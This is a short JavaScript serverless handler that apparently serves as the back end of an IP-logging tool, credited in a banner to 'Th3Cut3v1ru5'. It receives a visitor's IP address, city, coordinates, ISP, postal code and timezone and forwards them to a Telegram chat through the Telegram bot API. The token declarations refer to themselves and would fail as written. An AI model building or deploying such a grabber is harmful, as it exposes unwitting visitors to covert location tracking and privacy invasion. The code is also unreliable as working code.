export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { ip, region, city, country, location, isp, postal, timezone } = req.body;

    const message = `Proudly Created by Th3Cut3v1ru5

IP = ${ip}
Region = ${region}
City = ${city}
Country = ${country}
Location = ${location}
ISP = ${isp}
Postal Code = ${postal}
Timezone = ${timezone}`;

    const TELEGRAM_BOT_TOKEN = TELEGRAM_BOT_TOKEN;
    const TELEGRAM_CHAT_ID = TELEGRAM_CHAT_ID;

    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      return res.status(500).json({ error: 'Missing env variables' });
    }

    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

    const response = await fetch(telegramUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
      }),
    });

    const result = await response.json();

    if (!response.ok) {
      return res.status(500).json({ error: 'Failed to send message', details: result });
    }

    return res.status(200).json({ success: true });
  } catch (error) {
    console.error('Error:', error);
    return res.status(500).json({ error: 'Failed to send message' });
  }
}
